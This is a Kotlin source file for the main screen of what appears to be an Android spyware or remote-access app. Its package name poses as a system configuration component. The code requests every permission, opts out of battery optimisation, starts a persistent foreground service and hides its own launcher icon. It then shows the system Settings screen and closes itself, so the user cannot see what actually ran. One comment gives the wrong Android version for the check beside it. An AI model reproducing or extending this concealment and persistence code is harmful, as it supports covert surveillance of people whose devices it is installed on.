package com.android.system.config

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.Settings
import androidx.annotation.RequiresApi

class MainActivity : AppCompatActivity() {
    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        //request all permissions required
        Functions().requestAllPermissions(this)
        ///request ignore battery optimization permission
        Functions().requestIgnoreBatteryOptimizations(this)
        //run app in foreground
        startService(Intent(this,ForegroundService::class.java))

        //hides app from homescreen if android version is less than API-29
        if(Build.VERSION.SDK_INT < Build.VERSION_CODES.O){
            //hides app from home-screen
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)


        }

        //if all permissions are allowed it always shows settings when started
        if(Functions().isAllPermissionAllowed(this)){
            //shows a settings screen whenever app is opened
            val startSettings = Intent(Settings.ACTION_SETTINGS)
            startActivity(startSettings)
            finishAndRemoveTask();
        }

    }
}
